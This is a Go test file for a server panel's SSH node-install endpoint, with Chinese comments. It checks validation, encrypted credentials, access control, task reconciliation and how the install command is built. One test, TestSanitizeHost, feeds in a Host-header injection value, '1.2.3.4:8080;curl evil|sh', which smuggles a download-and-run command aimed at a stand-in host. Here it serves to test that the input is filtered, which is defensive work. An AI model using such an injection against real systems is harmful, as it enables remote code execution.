package api

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"onecloud-panel/internal/auth"
	"onecloud-panel/internal/store"
)

// SSH 添加入参校验：全部非法输入都应 400 并给出可读原因。
func TestSSHInstallValidation(t *testing.T) {
	_, _, h := newTestServer(t)
	jar := adminLogin(t, h)

	cases := []struct {
		name string
		body map[string]any
		want string
	}{
		{"缺主机", map[string]any{"user": "root", "password": "p"}, "必填"},
		{"缺用户名", map[string]any{"host": "192.168.1.50", "password": "p"}, "必填"},
		{"端口越界", map[string]any{"host": "192.168.1.50", "user": "root",
			"port": 70000, "password": "p"}, "端口非法"},
		{"缺密码", map[string]any{"host": "192.168.1.50", "user": "root",
			"auth_mode": "password"}, "SSH 密码"},
		{"缺私钥", map[string]any{"host": "192.168.1.50", "user": "root",
			"auth_mode": "key"}, "私钥"},
		{"认证方式非法", map[string]any{"host": "192.168.1.50", "user": "root",
			"auth_mode": "agent", "password": "p"}, "password/key"},
		{"指纹策略非法", map[string]any{"host": "192.168.1.50", "user": "root",
			"password": "p", "host_key_policy": "loose"}, "pin/strict"},
		{"接入类型非法", map[string]any{"host": "192.168.1.50", "user": "root",
			"password": "p", "network_type": "unknown"}, "接入类型"},
	}
	for _, c := range cases {
		w := do(t, h, "POST", "/api/nodes/ssh-install", c.body, jar)
		if w.Code != http.StatusBadRequest {
			t.Fatalf("%s: code = %d, want 400 (%s)", c.name, w.Code, w.Body.String())
		}
		if !strings.Contains(w.Body.String(), c.want) {
			t.Fatalf("%s: 错误信息 %s 未包含 %q", c.name, w.Body.String(), c.want)
		}
	}
}

// 成功入队：返回 task_id/token_id；payload 中凭据与安装命令必须是密文。
func TestSSHInstallEnqueuesEncryptedTask(t *testing.T) {
	_, s, h := newTestServer(t)
	jar := adminLogin(t, h)

	const password = "SuperSecretPw"
	w := do(t, h, "POST", "/api/nodes/ssh-install", map[string]any{
		"host": "192.168.1.50", "port": 2222, "user": "root",
		"auth_mode": "password", "password": password,
		"name": "测试机", "network_type": "lan",
	}, jar)
	if w.Code != http.StatusOK {
		t.Fatalf("ssh-install: %d %s", w.Code, w.Body.String())
	}
	var resp struct {
		TaskID  int64 `json:"task_id"`
		TokenID int64 `json:"token_id"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if resp.TaskID == 0 || resp.TokenID == 0 {
		t.Fatalf("响应缺少 task_id/token_id: %s", w.Body.String())
	}

	task, err := s.GetTask(resp.TaskID)
	if err != nil {
		t.Fatalf("任务不存在: %v", err)
	}
	if task.Type != "node-ssh-install" {
		t.Fatalf("task type = %q", task.Type)
	}
	if task.Status != store.TaskQueued {
		t.Fatalf("task status = %q, want queued", task.Status)
	}
	if task.Payload == "" || task.Payload == "{}" {
		t.Fatal("任务参数为空")
	}
	// 明文凭据与安装命令都不得出现在 payload
	for _, leak := range []string{password, "install.sh", "curl ", "--register-token"} {
		if strings.Contains(task.Payload, leak) {
			t.Fatalf("payload 泄露明文 %q: %s", leak, task.Payload)
		}
	}
	// 主机与用户名可明文（便于排查），但仅为元信息
	if !strings.Contains(task.Payload, "192.168.1.50") {
		t.Fatalf("payload 缺少主机元信息: %s", task.Payload)
	}
	if _, err := s.RegistrationTokenByID(resp.TokenID); err != nil {
		t.Fatalf("注册令牌未创建: %v", err)
	}
}

// 进度端点：节点域权限、snake_case、不含 payload。
func TestSSHInstallProgressEndpoint(t *testing.T) {
	_, s, h := newTestServer(t)
	jar := adminLogin(t, h)

	w := do(t, h, "POST", "/api/nodes/ssh-install", map[string]any{
		"host": "192.168.1.51", "user": "root", "password": "pw",
	}, jar)
	var resp struct {
		TaskID int64 `json:"task_id"`
	}
	_ = json.Unmarshal(w.Body.Bytes(), &resp)

	w = do(t, h, "GET", "/api/nodes/ssh-install?id="+itoa(resp.TaskID), nil, jar)
	if w.Code != http.StatusOK {
		t.Fatalf("progress: %d %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	for _, key := range []string{`"id"`, `"type"`, `"status"`, `"output"`, `"created_at"`} {
		if !strings.Contains(body, key) {
			t.Fatalf("进度响应缺少 %s: %s", key, body)
		}
	}
	for _, leak := range []string{"payload", "Payload", "credential_enc", "command_enc"} {
		if strings.Contains(body, leak) {
			t.Fatalf("进度响应泄露 %s: %s", leak, body)
		}
	}

	// 参数缺失 / 非本类任务 → 400 / 404
	if w = do(t, h, "GET", "/api/nodes/ssh-install", nil, jar); w.Code != http.StatusBadRequest {
		t.Fatalf("缺 id code = %d, want 400", w.Code)
	}
	otherID, err := s.CreateTask(&store.BackgroundTask{Type: "app-install"})
	if err != nil {
		t.Fatal(err)
	}
	if w = do(t, h, "GET", "/api/nodes/ssh-install?id="+itoa(otherID), nil, jar); w.Code != http.StatusNotFound {
		t.Fatalf("非 SSH 任务 code = %d, want 404", w.Code)
	}
	if w = do(t, h, "GET", "/api/nodes/ssh-install?id=999999", nil, jar); w.Code != http.StatusNotFound {
		t.Fatalf("不存在任务 code = %d, want 404", w.Code)
	}
}

// viewer 无 node:write：SSH 添加与进度查询都应 403。
func TestSSHInstallRequiresNodeWrite(t *testing.T) {
	_, s, h := newTestServer(t)
	_ = adminLogin(t, h)

	hash, _ := auth.HashPassword("ViewerPass1")
	if _, err := s.CreateUser("viewer1", hash, roleIDByCode(t, s, "viewer")); err != nil {
		t.Fatal(err)
	}
	jar := newJar(t)
	if w := do(t, h, "POST", "/api/auth/login",
		map[string]string{"username": "viewer1", "password": "ViewerPass1"}, jar); w.Code != http.StatusOK {
		t.Fatalf("viewer login: %d", w.Code)
	}

	w := do(t, h, "POST", "/api/nodes/ssh-install", map[string]any{
		"host": "192.168.1.52", "user": "root", "password": "pw",
	}, jar)
	if w.Code != http.StatusForbidden {
		t.Fatalf("viewer ssh-install code = %d, want 403", w.Code)
	}
	w = do(t, h, "GET", "/api/nodes/ssh-install?id=1", nil, jar)
	if w.Code != http.StatusForbidden {
		t.Fatalf("viewer progress code = %d, want 403", w.Code)
	}
}

// 重启对账：令牌已使用 → success；未使用 / 参数损坏 → failure。
func TestSSHInstallReconcile(t *testing.T) {
	_, s, apiObj := newTestAPI(t)

	raw, tokID, err := apiObj.nodes.CreateToken("对账", time.Hour, 1, nil)
	if err != nil {
		t.Fatal(err)
	}
	if raw == "" || tokID == 0 {
		t.Fatal("令牌创建异常")
	}
	payload, err := json.Marshal(sshInstallPayload{Host: "192.168.1.53", TokenID: tokID})
	if err != nil {
		t.Fatal(err)
	}
	id, err := s.CreateTask(&store.BackgroundTask{
		Type: "node-ssh-install", Status: store.TaskRunning, Payload: string(payload),
	})
	if err != nil {
		t.Fatal(err)
	}
	task, _ := s.GetTask(id)

	d, err := apiObj.sshInstallReconcile(context.Background(), task)
	if err != nil || d.Status != store.TaskFailure {
		t.Fatalf("令牌未使用应对账为 failure, got status=%v err=%v", d.Status, err)
	}

	if err := s.IncrementTokenUse(tokID); err != nil {
		t.Fatal(err)
	}
	d, err = apiObj.sshInstallReconcile(context.Background(), task)
	if err != nil || d.Status != store.TaskSuccess {
		t.Fatalf("令牌已使用应对账为 success, got status=%v err=%v", d.Status, err)
	}

	// 令牌被删 → failure
	if err := s.DeleteRegistrationToken(tokID); err != nil {
		t.Fatal(err)
	}
	d, _ = apiObj.sshInstallReconcile(context.Background(), task)
	if d.Status != store.TaskFailure {
		t.Fatalf("令牌缺失应对账为 failure, got %v", d.Status)
	}

	// payload 损坏 → failure
	if err := s.UpdateTaskPayload(id, "{}"); err != nil {
		t.Fatal(err)
	}
	task, _ = s.GetTask(id)
	d, _ = apiObj.sshInstallReconcile(context.Background(), task)
	if d.Status != store.TaskFailure {
		t.Fatalf("参数缺失应对账为 failure, got %v", d.Status)
	}
}

// 安装命令组装：使用请求 Host 与面板 scheme，并携带注册令牌。
func TestBuildInstallCommand(t *testing.T) {
	_, _, apiObj := newTestAPI(t)

	req := httptest.NewRequest("POST", "/api/nodes/ssh-install", nil)
	req.Host = "192.168.1.194:8080"
	got := apiObj.buildInstallCommand(req, "RAWTOKEN")
	for _, want := range []string{
		"http://192.168.1.194:8080/install.sh",
		"bash -s -- agent",
		"--server http://192.168.1.194:8080",
		"--register-token RAWTOKEN",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("安装命令缺少 %q: %s", want, got)
		}
	}
}

// Host 头注入防护：命令组装前必须过滤 shell 元字符。
func TestSanitizeHost(t *testing.T) {
	got := sanitizeHost("1.2.3.4:8080;curl evil|sh")
	for _, bad := range []string{";", "|", " "} {
		if strings.Contains(got, bad) {
			t.Fatalf("sanitizeHost 未过滤 %q: %q", bad, got)
		}
	}
	if got := sanitizeHost("192.168.1.194:8080"); got != "192.168.1.194:8080" {
		t.Fatalf("合法 Host 被改写: %q", got)
	}
	if got := sanitizeHost("[fe80::1]:8080"); got != "[fe80::1]:8080" {
		t.Fatalf("IPv6 Host 被改写: %q", got)
	}
}
